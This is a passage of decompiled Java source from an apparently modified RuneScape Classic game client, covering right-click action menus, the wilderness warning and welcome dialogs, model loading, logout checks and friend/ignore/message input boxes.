                            if(identify.spelltype[selectedspell] == 1 || identify.spelltype[selectedspell] == 2)
                            {
                                firstmsg[listcount] = "Cast " + identify.spellname[selectedspell] + " on";
                                secondmsg[listcount] = "@whi@" + player[i2].name + s;
                                actiontype[listcount] = 800;
                                actionx[listcount] = player[i2].x;
                                actiony[listcount] = player[i2].y;
                                actionid[listcount] = player[i2].id;
                                actionvar[listcount] = selectedspell;
                                listcount++;
                            }
                        } else
                        if(selecteditem >= 0)
                        {
                            firstmsg[listcount] = "Use " + selecteditemname + " with";
                            secondmsg[listcount] = "@whi@" + player[i2].name + s;
                            actiontype[listcount] = 810;
                            actionx[listcount] = player[i2].x;
                            actiony[listcount] = player[i2].y;
                            actionid[listcount] = player[i2].id;
                            actionvar[listcount] = selecteditem;
                            listcount++;
                        } else
                        {
                            if(i > 0 && (player[i2].y - 64) / absnpc + dhb + bigy < 2203)
                            {
                                firstmsg[listcount] = "Attack";
                                secondmsg[listcount] = "@whi@" + player[i2].name + s;
								actiontype[listcount] = 805;
                                /*
								if(k3 >= 0 && k3 < 5)
                                    actiontype[listcount] = 805;
                                else
                                    actiontype[listcount] = 2805;
								*/
                                actionx[listcount] = player[i2].x;
                                actiony[listcount] = player[i2].y;
                                actionid[listcount] = player[i2].id;
                                listcount++;
                            } else
                            if(ServerList.world == 82 || ServerList.world == 84 || ServerList.world == 86)
                            {
                                firstmsg[listcount] = "Duel with";
                                secondmsg[listcount] = "@whi@" + player[i2].name + s;
                                actionx[listcount] = player[i2].x;
                                actiony[listcount] = player[i2].y;
                                actiontype[listcount] = 2806;
                                actionid[listcount] = player[i2].id;
                                listcount++;
                            }
                            firstmsg[listcount] = "Trade with";
                            secondmsg[listcount] = "@whi@" + player[i2].name + s;
                            actiontype[listcount] = 2810;
                            actionid[listcount] = player[i2].id;
                            listcount++;
                            firstmsg[listcount] = "Ghost";
                            secondmsg[listcount] = "@whi@" + player[i2].name + s;
                            actiontype[listcount] = 1337357;
                            actionid[listcount] = player[i2].id;
                            listcount++;
                            firstmsg[listcount] = "Follow";
                            secondmsg[listcount] = "@whi@" + player[i2].name + s;
                            actiontype[listcount] = 2820;
                            actionid[listcount] = player[i2].id;
                            listcount++;
                        }
                    } else
                    if(l2 == 2)
                    {
                        if(selectedspell >= 0)
                        {
                            if(identify.spelltype[selectedspell] == 3)
                            {
                                firstmsg[listcount] = "Cast " + identify.spellname[selectedspell] + " on";
                                secondmsg[listcount] = "@lre@" + identify.itemName[itemtype[i2]];
                                actiontype[listcount] = 200;
                                actionx[listcount] = itemx[i2];
                                actiony[listcount] = itemy[i2];
                                actionid[listcount] = itemtype[i2];
                                actionvar[listcount] = selectedspell;
                                listcount++;
                            }
                        } else
                        if(selecteditem >= 0)
                        {
                            firstmsg[listcount] = "Use " + selecteditemname + " with";
                            secondmsg[listcount] = "@lre@" + identify.itemName[itemtype[i2]];
                            actiontype[listcount] = 210;
                            actionx[listcount] = itemx[i2];
                            actiony[listcount] = itemy[i2];
                            actionid[listcount] = itemtype[i2];
                            actionvar[listcount] = selecteditem;
                            listcount++;
                        } else
                        {
                            firstmsg[listcount] = "Take";
                            secondmsg[listcount] = "@lre@" + identify.itemName[itemtype[i2]];
                            actiontype[listcount] = 220;
                            actionx[listcount] = itemx[i2];
                            actiony[listcount] = itemy[i2];
                            actionid[listcount] = itemtype[i2];
                            listcount++;
                            firstmsg[listcount] = "Examine";
                            secondmsg[listcount] = "@lre@" + identify.itemName[itemtype[i2]];
                            actiontype[listcount] = 3200;
                            actionid[listcount] = itemtype[i2];
                            listcount++;
                        }
                    } else
                    if(l2 == 3)
                    {
                        String s1 = "";
                        int l3 = -1;
                        int i4 = npc[i2].type;
                        if(identify.attackable[i4] > 0)
                        {
                            int j4 = (identify.npcAttack[i4] + identify.npcDefence[i4] + identify.npcStrength[i4] + identify.npcHits[i4]) / 4;
                            int k4 = (stat[0] + stat[1] + stat[2] + stat[3] + 27) / 4;
                            l3 = k4 - j4;
                            s1 = "@yel@";
                            if(l3 < 0)
                                s1 = "@or1@";
                            if(l3 < -3)
                                s1 = "@or2@";
                            if(l3 < -6)
                                s1 = "@or3@";
                            if(l3 < -9)
                                s1 = "@red@";
                            if(l3 > 0)
                                s1 = "@gr1@";
                            if(l3 > 3)
                                s1 = "@gr2@";
                            if(l3 > 6)
                                s1 = "@gr3@";
                            if(l3 > 9)
                                s1 = "@gre@";
                            s1 = " " + s1 + "(level-" + j4 + ")";
                        }
                        if(selectedspell >= 0)
                        {
                            if(identify.spelltype[selectedspell] == 2)
                            {
                                firstmsg[listcount] = "Cast " + identify.spellname[selectedspell] + " on";
                                secondmsg[listcount] = "@yel@" + identify.npcName[npc[i2].type];
                                actiontype[listcount] = 700;
                                actionx[listcount] = npc[i2].x;
                                actiony[listcount] = npc[i2].y;
                                actionid[listcount] = npc[i2].id;
                                actionvar[listcount] = selectedspell;
                                listcount++;
                            }
                        } else
                        if(selecteditem >= 0)
                        {
                            firstmsg[listcount] = "Use " + selecteditemname + " with";
                            secondmsg[listcount] = "@yel@" + identify.npcName[npc[i2].type];
                            actiontype[listcount] = 710;
                            actionx[listcount] = npc[i2].x;
                            actiony[listcount] = npc[i2].y;
                            actionid[listcount] = npc[i2].id;
                            actionvar[listcount] = selecteditem;
                            listcount++;
                        } else
                        {
                            if(identify.attackable[i4] > 0)
                            {
                                firstmsg[listcount] = "Attack";
                                secondmsg[listcount] = "@yel@" + identify.npcName[npc[i2].type] + s1;
                                if(l3 >= 0)
                                    actiontype[listcount] = 715;
                                else
                                    actiontype[listcount] = 2715;
                                actionx[listcount] = npc[i2].x;
                                actiony[listcount] = npc[i2].y;
                                actionid[listcount] = npc[i2].id;
                                listcount++;
                            }
                            firstmsg[listcount] = "Talk-to";
                            secondmsg[listcount] = "@yel@" + identify.npcName[npc[i2].type];
                            actiontype[listcount] = 720;
                            actionx[listcount] = npc[i2].x;
                            actiony[listcount] = npc[i2].y;
                            actionid[listcount] = npc[i2].id;
                            listcount++;
                            if(!identify.npcCommand[i4].equals(""))
                            {
                                firstmsg[listcount] = identify.npcCommand[i4];
                                secondmsg[listcount] = "@yel@" + identify.npcName[npc[i2].type];
                                actiontype[listcount] = 725;
                                actionx[listcount] = npc[i2].x;
                                actiony[listcount] = npc[i2].y;
                                actionid[listcount] = npc[i2].id;
                                listcount++;
                            }
                            firstmsg[listcount] = "Examine";
                            secondmsg[listcount] = "@yel@" + identify.npcName[npc[i2].type];
                            actiontype[listcount] = 3700;
                            actionid[listcount] = npc[i2].type;
                            listcount++;
                        }
                    }
                } else
                if(class5 != null && class5.anInt257 >= 10000)
                {
                    int j2 = class5.anInt257 - 10000;
                    int i3 = doortype[j2];
                    if(!djd[j2])
                    {
                        if(selectedspell >= 0)
                        {
                            if(identify.spelltype[selectedspell] == 4)
                            {
                                firstmsg[listcount] = "Cast " + identify.spellname[selectedspell] + " on";
                                secondmsg[listcount] = "@cya@" + identify.doorname[i3];
                                actiontype[listcount] = 300;
                                actionx[listcount] = doorx[j2];
                                actiony[listcount] = doory[j2];
                                actionid[listcount] = doordir[j2];
                                actionvar[listcount] = selectedspell;
                                listcount++;
                            }
                        } else
                        if(selecteditem >= 0)
                        {
                            firstmsg[listcount] = "Use " + selecteditemname + " with";
                            secondmsg[listcount] = "@cya@" + identify.doorname[i3];
                            actiontype[listcount] = 310;
                            actionx[listcount] = doorx[j2];
                            actiony[listcount] = doory[j2];
                            actionid[listcount] = doordir[j2];
                            actionvar[listcount] = selecteditem;
                            listcount++;
                        } else
                        {
                            if(!identify.dooraction[i3].equalsIgnoreCase("WalkTo"))
                            {
                                firstmsg[listcount] = identify.dooraction[i3];
                                secondmsg[listcount] = "@cya@" + identify.doorname[i3];
                                actiontype[listcount] = 320;
                                actionx[listcount] = doorx[j2];
                                actiony[listcount] = doory[j2];
                                actionid[listcount] = doordir[j2];
                                listcount++;
                            }
                            if(!identify.dooraction2[i3].equalsIgnoreCase("Examine"))
                            {
                                firstmsg[listcount] = identify.dooraction2[i3];
                                secondmsg[listcount] = "@cya@" + identify.doorname[i3];
                                actiontype[listcount] = 2300;
                                actionx[listcount] = doorx[j2];
                                actiony[listcount] = doory[j2];
                                actionid[listcount] = doordir[j2];
                                listcount++;
                            }
                            firstmsg[listcount] = "Examine";
                            secondmsg[listcount] = "@cya@" + identify.doorname[i3];
                            actiontype[listcount] = 3300;
                            actionid[listcount] = i3;
                            listcount++;
                        }
                        djd[j2] = true;
                    }
                } else
                if(class5 != null && class5.anInt257 >= 0)
                {
                    int k2 = class5.anInt257;
                    int j3 = mobtype[k2];
                    if(!eea[k2])
                    {
                        if(selectedspell >= 0)
                        {
                            if(identify.spelltype[selectedspell] == 5)
                            {
                                firstmsg[listcount] = "Cast " + identify.spellname[selectedspell] + " on";
                                secondmsg[listcount] = "@cya@" + identify.mobName[j3];
                                actiontype[listcount] = 400;
                                actionx[listcount] = mobx[k2];
                                actiony[listcount] = moby[k2];
                                actionid[listcount] = mobid[k2];
                                actionvar[listcount] = mobtype[k2];
                                actionvar2[listcount] = selectedspell;
                                listcount++;
                            }
                        } else
                        if(selecteditem >= 0)
                        {
                            firstmsg[listcount] = "Use " + selecteditemname + " with";
                            secondmsg[listcount] = "@cya@" + identify.mobName[j3];
                            actiontype[listcount] = 410;
                            actionx[listcount] = mobx[k2];
                            actiony[listcount] = moby[k2];
                            actionid[listcount] = mobid[k2];
                            actionvar[listcount] = mobtype[k2];
                            actionvar2[listcount] = selecteditem;
                            listcount++;
                        } else
                        {
                            if(!identify.mobCommand1[j3].equalsIgnoreCase("WalkTo"))
                            {
                                firstmsg[listcount] = identify.mobCommand1[j3];
                                secondmsg[listcount] = "@cya@" + identify.mobName[j3];
                                actiontype[listcount] = 420;
                                actionx[listcount] = mobx[k2];
                                actiony[listcount] = moby[k2];
                                actionid[listcount] = mobid[k2];
                                actionvar[listcount] = mobtype[k2];
                                listcount++;
                            }
                            if(!identify.mobCommand2[j3].equalsIgnoreCase("Examine"))
                            {
                                firstmsg[listcount] = identify.mobCommand2[j3];
                                secondmsg[listcount] = "@cya@" + identify.mobName[j3];
                                actiontype[listcount] = 2400;
                                actionx[listcount] = mobx[k2];
                                actiony[listcount] = moby[k2];
                                actionid[listcount] = mobid[k2];
                                actionvar[listcount] = mobtype[k2];
                                listcount++;
                            }
                            firstmsg[listcount] = "Examine";
                            secondmsg[listcount] = "@cya@" + identify.mobName[j3];
                            actiontype[listcount] = 3400;
                            actionid[listcount] = j3;
                            listcount++;
                        }
                        eea[k2] = true;
                    }
                } else
                {
                    if(k1 >= 0)
                        k1 = class5.anIntArray258[k1] - 0x30d40;
                    if(k1 >= 0)
                        j = k1;
                }
        }

        if(selectedspell >= 0 && identify.spelltype[selectedspell] <= 1)
        {
            firstmsg[listcount] = "Cast " + identify.spellname[selectedspell] + " on self";
            secondmsg[listcount] = "";
            actiontype[listcount] = 1000;
            actionid[listcount] = selectedspell;
            listcount++;
        }
        if(j != -1)
        {
            int l1 = j;
            if(selectedspell >= 0)
            {
                if(identify.spelltype[selectedspell] == 6)
                {
                    firstmsg[listcount] = "Cast " + identify.spellname[selectedspell] + " on ground";
                    secondmsg[listcount] = "";
                    actiontype[listcount] = 900;
                    actionx[listcount] = efh.gjk[l1];
                    actiony[listcount] = efh.gki[l1];
                    actionid[listcount] = selectedspell;
                    listcount++;
                    return;
                }
            } else
            if(selecteditem < 0)
            {
                firstmsg[listcount] = "Walk here";
                secondmsg[listcount] = "";
                actiontype[listcount] = 920;
                actionx[listcount] = efh.gjk[l1];
                actiony[listcount] = efh.gki[l1];
                listcount++;
            }
        }
    }

    public final void method63()
    {
        int i = 97;
        gfx.method216(86, 77, 340, 180, 0);
        gfx.method217(86, 77, 340, 180, 0xffffff);
        gfx.drawString("Warning! Proceed with caution", 256, i, 4, 0xff0000);
        i += 26;
        gfx.drawString("If you go much further north you will enter the", 256, i, 1, 0xffffff);
        i += 13;
        gfx.drawString("wilderness. This a very dangerous area where", 256, i, 1, 0xffffff);
        i += 13;
        gfx.drawString("other players can attack you!", 256, i, 1, 0xffffff);
        i += 22;
        gfx.drawString("The further north you go the more dangerous it", 256, i, 1, 0xffffff);
        i += 13;
        gfx.drawString("becomes, but the more treasure you will find.", 256, i, 1, 0xffffff);
        i += 22;
        gfx.drawString("In the wilderness an indicator at the bottom-right", 256, i, 1, 0xffffff);
        i += 13;
        gfx.drawString("of the screen will show the current level of danger", 256, i, 1, 0xffffff);
        i += 22;
        int j = 0xffffff;
        if(super.anInt34 > i - 12 && super.anInt34 <= i && super.anInt33 > 181 && super.anInt33 < 331)
            j = 0xff0000;
        gfx.drawString("Click here to close window", 256, i, 1, j);
        if(anInt813 != 0)
        {
            if(super.anInt34 > i - 12 && super.anInt34 <= i && super.anInt33 > 181 && super.anInt33 < 331)
                anInt725 = 2;
            if(super.anInt33 < 86 || super.anInt33 > 426 || super.anInt34 < 77 || super.anInt34 > 257)
                anInt725 = 2;
            anInt813 = 0;
        }
    }

    public final void method64()
    {
        int l = identify.anInt144;
        identify.method124("torcha2");
        identify.method124("torcha3");
        identify.method124("torcha4");
        identify.method124("skulltorcha2");
        identify.method124("skulltorcha3");
        identify.method124("skulltorcha4");
        identify.method124("firea2");
        identify.method124("firea3");
        identify.method124("fireplacea2");
        identify.method124("fireplacea3");
        identify.method124("firespell2");
        identify.method124("firespell3");
        identify.method124("lightning2");
        identify.method124("lightning3");
        identify.method124("clawspell2");
        identify.method124("clawspell3");
        identify.method124("clawspell4");
        identify.method124("clawspell5");
        identify.method124("spellcharge2");
        identify.method124("spellcharge3");
        if(!method7())
        {
            byte abyte0[] = method18("models" + Class18.anInt577 + ".jag", "3d models", 60);
            if(abyte0 == null)
            {
                aBoolean922 = true;
                return;
            }
            for(int j = 0; j < identify.anInt74; j++)
            {
                int k = fnf.method364(identify.aStringArray126[j] + ".ob3", abyte0);
                if(k != 0)
                    aClass5Array994[j] = new Class5(abyte0, k, true);
                else
                    aClass5Array994[j] = new Class5(1, 1);
                if(identify.aStringArray126[j].equals("giantcrystal"))
                    aClass5Array994[j].aBoolean256 = true;
            }

            return;
        }
        method15(70, "Loading 3d models");
        for(int i = 0; i < identify.anInt74; i++)
        {
            aClass5Array994[i] = new Class5("../gamedata/models/" + identify.aStringArray126[i] + ".ob2");
            if(identify.aStringArray126[i].equals("giantcrystal"))
                aClass5Array994[i].aBoolean256 = true;
        }

    }

    public final void method65()
    {
        int i = identify.anInt144;
        if(anInt746 != 0)
            method88();
        else
		/*
        if(aBoolean908)
            method67();
        else
        if(aBoolean745)
			method49();
		*/


        if(anInt725 == 1)
            method63();
        else
        if(bank && anInt869 == 0)
            method81();
        else
        if(shop && anInt869 == 0)
            method117();
        else
        if(tradeSecond)
            method92();
        else
        if(tradeFirst)
            method51();
        else
        if(aBoolean801)
            method100();
        else
        if(aBoolean917)
            method87();
        else
        if(anInt986 == 1)
            method116();
        else
        if(anInt986 == 2)
            method47();
        else




        if(anInt931 != 0)
        {
            method75();
        } else
        {
            if(QuestMenu)
                method46();
            if(myplayer.hah == 8 || myplayer.hah == 9)
                method90();
            method114();
            boolean flag = !QuestMenu && !aBoolean854;
            if(flag)
                listcount = 0;
            if(selectedmenu == 0 && flag)
                method62();
            if(selectedmenu == 1)
                method56(flag);
            if(selectedmenu == 2)
                method103(flag);
            if(selectedmenu == 3)
                method115(flag);
            if(selectedmenu == 4)
                method53(flag);
            if(selectedmenu == 5)
                method80(flag);
            if(selectedmenu == 6)
                method60(flag);
            if(!aBoolean854 && !QuestMenu)
                method91();
            if(aBoolean854 && !QuestMenu)
                method110();
        }
        anInt813 = 0;
    }

    public final void method66()
    {
        super.aString42 = "";
        super.aString43 = "";
    }

    public final void method67()
    {
        int i1 = identify.anInt144;
        int i = 65;
        if(anInt685 != 201)
            i += 60;
        if(anInt924 > 0)
            i += 60;
        if(anInt782 != 0)
            i += 45;
        int j = 167 - i / 2;
        gfx.method216(56, 167 - i / 2, 400, i, 0);
        gfx.method217(56, 167 - i / 2, 400, i, 0xffffff);
        j += 20;
        gfx.drawString("Welcome to RuneScape " + djk, 256, j, 4, 0xffff00);
        j += 30;
        String s;
        if(anInt898 == 0)
            s = "earlier today";
        else
        if(anInt898 == 1)
            s = "yesterday";
        else
            s = anInt898 + " days ago";
        if(anInt782 != 0)
        {
            gfx.drawString("You last logged in " + s, 256, j, 1, 0xffffff);
            j += 15;
            if(aString894 == null)
                aString894 = method54(anInt782);
            gfx.drawString("from: " + aString894, 256, j, 1, 0xffffff);
            j += 15;
            j += 15;
        }
        if(anInt924 > 0)
        {
            int k = 0xffffff;
            gfx.drawString("Jagex staff will NEVER email you. We use the", 256, j, 1, k);
            j += 15;
            gfx.drawString("message-centre on this website instead.", 256, j, 1, k);
            j += 15;
            if(anInt924 == 1)
                gfx.drawString("You have @yel@0@whi@ unread messages in your message-centre", 256, j, 1, 0xffffff);
            else
                gfx.drawString("You have @gre@" + (anInt924 - 1) + " unread messages @whi@in your message-centre", 256, j, 1, 0xffffff);
            j += 15;
            j += 15;
        }
        if(anInt685 != 201)
        {
            if(anInt685 == 200)
            {
                gfx.drawString("You have not yet set any password recovery questions.", 256, j, 1, 0xff8000);
                j += 15;
                gfx.drawString("We strongly recommend you do so now to secure your account.", 256, j, 1, 0xff8000);
                j += 15;
                gfx.drawString("Do this from the 'account management' area on our front webpage", 256, j, 1, 0xff8000);
                j += 15;
            } else
            {
                String s1;
                if(anInt685 == 0)
                    s1 = "Earlier today";
                else
                if(anInt685 == 1)
                    s1 = "Yesterday";
                else
                    s1 = anInt685 + " days ago";
                gfx.drawString(s1 + " you changed your recovery questions", 256, j, 1, 0xff8000);
                j += 15;
                gfx.drawString("If you do not remember making this change then cancel it immediately", 256, j, 1, 0xff8000);
                j += 15;
                gfx.drawString("Do this from the 'account management' area on our front webpage", 256, j, 1, 0xff8000);
                j += 15;
            }
            j += 15;
        }
        int l = 0xffffff;
        if(super.anInt34 > j - 12 && super.anInt34 <= j && super.anInt33 > 106 && super.anInt33 < 406)
            l = 0xff0000;
        gfx.drawString("Click here to close window", 256, j, 1, l);
        if(anInt813 == 1)
        {
            if(l == 0xff0000)
                aBoolean908 = false;
            if((super.anInt33 < 86 || super.anInt33 > 426) && (super.anInt34 < 167 - i / 2 || super.anInt34 > 167 + i / 2))
                aBoolean908 = false;
        }
        anInt813 = 0;
    }

    final void method68(int i, int j, int k, int l, int i1, int j1, int k1)
    {
        int l5 = identify.anInt144;
        Class2 class2 = npc[i1];
        int l1 = class2.hah + (anInt729 + 16) / 32 & 7;
        boolean flag = false;
        int i2 = l1;
        if(i2 == 5)
        {
            i2 = 3;
            flag = true;
        } else
        if(i2 == 6)
        {
            i2 = 2;
            flag = true;
        } else
        if(i2 == 7)
        {
            i2 = 1;
            flag = true;
        }
        int j2 = i2 * 3 + anIntArray726[(class2.anInt152 / identify.anIntArray105[class2.type]) % 4];
        if(class2.hah == 8)
        {
            i2 = 5;
            l1 = 2;
            flag = false;
            i -= (identify.anIntArray107[class2.type] * k1) / 100;
            j2 = i2 * 3 + anIntArray939[(anInt918 / (identify.anIntArray106[class2.type] - 1)) % 8];
        } else
        if(class2.hah == 9)
        {
            i2 = 5;
            l1 = 2;
            flag = true;
            i += (identify.anIntArray107[class2.type] * k1) / 100;
            j2 = i2 * 3 + anIntArray909[(anInt918 / identify.anIntArray106[class2.type]) % 8];
        }
        for(int k2 = 0; k2 < 12; k2++)
        {
            int l2 = anIntArrayArray684[l1][k2];
            int k3 = identify.anIntArrayArray90[class2.type][l2];
            if(k3 >= 0)
            {
                int i4 = 0;
                int j4 = 0;
                int k4 = j2;
                if(flag && i2 >= 1 && i2 <= 3 && identify.anIntArray86[k3] == 1)
                    k4 += 15;
                if(i2 != 5 || identify.anIntArray85[k3] == 1)
                {
                    int l4 = k4 + identify.anIntArray87[k3];
                    i4 = (i4 * k) / ((Class6) (gfx)).anIntArray328[l4];
                    j4 = (j4 * l) / ((Class6) (gfx)).anIntArray329[l4];
                    int i5 = (k * ((Class6) (gfx)).anIntArray328[l4]) / ((Class6) (gfx)).anIntArray328[identify.anIntArray87[k3]];
                    i4 -= (i5 - k) / 2;
                    int j5 = identify.anIntArray83[k3];
                    int k5 = 0;
                    if(j5 == 1)
                    {
                        j5 = identify.anIntArray130[class2.type];
                        k5 = identify.anIntArray133[class2.type];
                    } else
                    if(j5 == 2)
                    {
                        j5 = identify.anIntArray131[class2.type];
                        k5 = identify.anIntArray133[class2.type];
                    } else
                    if(j5 == 3)
                    {
                        j5 = identify.anIntArray132[class2.type];
                        k5 = identify.anIntArray133[class2.type];
                    }
                    gfx.method247(i + i4, j + j4, i5, l, l4, j5, k5, j1, flag);
                }
            }
        }

        if(class2.lastSaidTime > 0)
        {
            anIntArray967[anInt820] = gfx.method263(class2.lastSaidMessage, 1) / 2;
            if(anIntArray967[anInt820] > 150)
                anIntArray967[anInt820] = 150;
            anIntArray968[anInt820] = (gfx.method263(class2.lastSaidMessage, 1) / 300) * gfx.method261(1);
            anIntArray965[anInt820] = i + k / 2;
            anIntArray966[anInt820] = j;
            aStringArray821[anInt820++] = class2.lastSaidMessage;
        }
        if(class2.hah == 8 || class2.hah == 9 || class2.anInt167 != 0)
        {
            if(class2.anInt167 > 0)
            {
                int i3 = i;
                if(class2.hah == 8)
                    i3 -= (20 * k1) / 100;
                else
                if(class2.hah == 9)
                    i3 += (20 * k1) / 100;
                int l3 = (class2.anInt165 * 30) / class2.hbg;
                anIntArray687[anInt766] = i3 + k / 2;
                anIntArray688[anInt766] = j;
                anIntArray689[anInt766++] = l3;
            }
            if(class2.anInt167 > 150)
            {
                int j3 = i;
                if(class2.hah == 8)
                    j3 -= (10 * k1) / 100;
                else
                if(class2.hah == 9)
                    j3 += (10 * k1) / 100;
                gfx.method231((j3 + k / 2) - 12, (j + l / 2) - 12, anInt948 + 12);
                gfx.drawString(String.valueOf(class2.anInt164), (j3 + k / 2) - 1, j + l / 2 + 5, 3, 0xffffff);
            }
        }
    }

    public final void method69()
    {
        gfx.method231(0, anInt677 - 4, anInt948 + 23);
        int i = Class6.method223(200, 200, 255);
        if(anInt780 == 0)
            i = Class6.method223(255, 200, 50);
        if(anInt790 % 30 > 15)
            i = Class6.method223(255, 50, 50);
        gfx.drawString("All messages", 54, anInt677 + 6, 0, i);
        i = Class6.method223(200, 200, 255);
        if(anInt780 == 1)
            i = Class6.method223(255, 200, 50);
        if(anInt791 % 30 > 15)
            i = Class6.method223(255, 50, 50);
        gfx.drawString("Chat history", 155, anInt677 + 6, 0, i);
        i = Class6.method223(200, 200, 255);
        if(anInt780 == 2)
            i = Class6.method223(255, 200, 50);
        if(anInt792 % 30 > 15)
            i = Class6.method223(255, 50, 50);
        gfx.drawString("Quest history", 255, anInt677 + 6, 0, i);
        i = Class6.method223(200, 200, 255);
        if(anInt780 == 3)
            i = Class6.method223(255, 200, 50);
        if(anInt793 % 30 > 15)
            i = Class6.method223(255, 50, 50);
        gfx.drawString("Private history", 355, anInt677 + 6, 0, i);
        gfx.drawString("Report abuse", 457, anInt677 + 6, 0, 0xffffff);
    }

    public final void method70()
    {
        int j = identify.anInt144;
        aBoolean849 = false;
        gfx.aBoolean335 = false;
        gfx.method212();
        if(anInt690 == 0 || anInt690 == 1 || anInt690 == 2 || anInt690 == 3)
        {
            int i = (anInt918 * 2) % 3072;
            if(i < 1024)
            {
                gfx.method231(0, 10, anInt954);
                if(i > 768)
                    gfx.method233(0, 10, anInt954 + 1, i - 768);
            } else
            if(i < 2048)
            {
                gfx.method231(0, 10, anInt954 + 1);
                if(i > 1792)
                    gfx.method233(0, 10, anInt948 + 10, i - 1792);
            } else
            {
                gfx.method231(0, 10, anInt948 + 10);
                if(i > 2816)
                    gfx.method233(0, 10, anInt954, i - 2816);
            }
        }
        if(anInt690 == 0)
            elj.method142();
        if(anInt690 == 1)
            aClass4_667.method142();
        if(anInt690 == 2)
            aClass4_751.method142();
        gfx.method231(0, anInt677, anInt948 + 22);
        gfx.method211(aGraphics857, 0, 0);
    }

    public final void Logout()
    {
        if(ehc == 0)
            return;
        if(anInt869 > 450)
        {
            DisplayMessage("@cya@You can't logout during combat!", 3);
            return;
        }
        if(anInt869 > 0)
        {
            DisplayMessage("@cya@You can't logout for 10 seconds after combat", 3);
            return;
        } else
        {
            super.packets.id(3);
            super.packets.send();
            anInt746 = 1000;
            return;
        }
    }

    public final void method72()
    {
        int i1 = identify.anInt144;
        anInt889 = anInt936;
        for(int i = 0; i < anInt936; i++)
        {
            anIntArray955[i] = anIntArray816[i];
            anIntArray956[i] = anIntArray817[i];
        }

        for(int j = 0; j < InvCount; j++)
        {
            if(anInt889 >= anInt916)
                break;
            int k = inv[j];
            boolean flag = false;
            for(int l = 0; l < anInt889; l++)
            {
                if(anIntArray955[l] != k)
                    continue;
                flag = true;
                break;
            }

            if(!flag)
            {
                anIntArray955[anInt889] = k;
                anIntArray956[anInt889] = 0;
                anInt889++;
            }
        }

    }

    public final void method73()
    {
        byte abyte0[] = method18("config" + Class18.anInt574 + ".jag", "Configuration", 10);
        if(abyte0 == null)
        {
            aBoolean922 = true;
            return;
        }
        identify.method129(abyte0, member);
        byte abyte1[] = method18("filter" + Class18.anInt581 + ".jag", "Chat system", 15);
        if(abyte1 == null)
        {
            aBoolean922 = true;
            return;
        } else
        {
            byte abyte2[] = fnf.method366("fragmentsenc.txt", 0, abyte1);
            byte abyte3[] = fnf.method366("badenc.txt", 0, abyte1);
            byte abyte4[] = fnf.method366("hostenc.txt", 0, abyte1);
            byte abyte5[] = fnf.method366("tldlist.txt", 0, abyte1);
            ffn.method368(new Class13(abyte2), new Class13(abyte3), new Class13(abyte4), new Class13(abyte5));
            return;
        }
    }

    public final void method74(int i, int j, int k)
    {
        gfx.method220(i, j, k);
        gfx.method220(i - 1, j, k);
        gfx.method220(i + 1, j, k);
        gfx.method220(i, j - 1, k);
        gfx.method220(i, j + 1, k);
    }

    public final void method75()
    {
        if(anInt813 != 0)
        {
            anInt813 = 0;
            if(anInt931 == 1 && (super.anInt33 < 106 || super.anInt34 < 145 || super.anInt33 > 406 || super.anInt34 > 215))
            {
                anInt931 = 0;
                return;
            }
            if(anInt931 == 2 && (super.anInt33 < 6 || super.anInt34 < 145 || super.anInt33 > 506 || super.anInt34 > 215))
            {
                anInt931 = 0;
                return;
            }
            if(anInt931 == 3 && (super.anInt33 < 106 || super.anInt34 < 145 || super.anInt33 > 406 || super.anInt34 > 215))
            {
                anInt931 = 0;
                return;
            }
            if(super.anInt33 > 236 && super.anInt33 < 276 && super.anInt34 > 193 && super.anInt34 < 213)
            {
                anInt931 = 0;
                return;
            }
        }
        int i = 145;
        if(anInt931 == 1)
        {
            gfx.method216(106, i, 300, 70, 0);
            gfx.method217(106, i, 300, 70, 0xffffff);
            i += 20;
            gfx.drawString("Enter name to add to friends list", 256, i, 4, 0xffffff);
            i += 20;
            gfx.drawString(super.fln + "*", 256, i, 4, 0xffffff);
            if(super.fma.length() > 0)
            {
                String s = super.fma.trim();
                super.fln = "";
                super.fma = "";
                anInt931 = 0;
                if(s.length() > 0 && fnf.method362(s) != myplayer.aLong145)
                    method31(s);
            }
        }
        if(anInt931 == 2)
        {
            gfx.method216(6, i, 500, 70, 0);
            gfx.method217(6, i, 500, 70, 0xffffff);
            i += 20;
            gfx.drawString("Enter message to send to " + fnf.method363(aLong928), 256, i, 4, 0xffffff);
            i += 20;
            gfx.drawString(super.aString42 + "*", 256, i, 4, 0xffffff);
            if(super.aString43.length() > 0)
            {
                String s1 = super.aString43;
                super.aString42 = "";
                super.aString43 = "";
                anInt931 = 0;
                int k = cen.cfe(s1);
                method33(aLong928, cen.cfa, k);
                s1 = cen.cfd(cen.cfa, 0, k);
                s1 = ffn.fhe(s1);   
                method42("@pri@You tell " + fnf.method363(aLong928) + ": " + s1);
            }
        }
        if(anInt931 == 3)
        {
            gfx.method216(106, i, 300, 70, 0);
            gfx.method217(106, i, 300, 70, 0xffffff);
            i += 20;
            gfx.drawString("Enter name to add to ignore list", 256, i, 4, 0xffffff);
            i += 20;
            gfx.drawString(super.fln + "*", 256, i, 4, 0xffffff);
            if(super.fma.length() > 0)
            {
                String s2 = super.fma.trim();
                super.fln = "";
                super.fma = "";
                anInt931 = 0;
                if(s2.length() > 0 && fnf.method362(s2) != myplayer.aLong145)
                    method29(s2);
            }
        }
        int j = 0xffffff;
        if(super.anInt33 > 236 && super.anInt33 < 276 && super.anInt34 > 193 && super.anInt34 < 213)
            j = 0xffff00;
        gfx.drawString("Cancel", 256, 208, 1, j);
    }

    public final Class2 method76(int i, int j, int k, int l)
    {
        int k1 = identify.anInt144;
        if(aClass2Array891[i] == null)
        {
            aClass2Array891[i] = new Class2();
            aClass2Array891[i].id = i;
            aClass2Array891[i].anInt148 = 0;
        }
        Class2 class2 = aClass2Array891[i];
        boolean flag = false;
        for(int i1 = 0; i1 < anInt743; i1++)
        {
            if(aClass2Array923[i1].id != i)
                continue;
            flag = true;
            break;
        }

        if(flag)
        {
            class2.anInt154 = l;
            int j1 = class2.anInt156;
            if(j != class2.anIntArray157[j1] || k != class2.anIntArray158[j1])
            {
                class2.anInt156 = j1 = (j1 + 1) % 10;
                class2.anIntArray157[j1] = j;
                class2.anIntArray158[j1] = k;
            }
        } else
        {
            class2.id = i;
            class2.anInt155 = 0;
            class2.anInt156 = 0;
            class2.anIntArray157[0] = class2.x = j;
            class2.anIntArray158[0] = class2.y = k;
            class2.anInt154 = class2.hah = l;
            class2.anInt152 = 0;
        }
        player[playerCount++] = class2;
        return class2;
    }

    public final void method77()
    {
        int i2 = identify.anInt144;
        int i = 0;
        byte byte0 = 50;
        byte byte1 = 50;
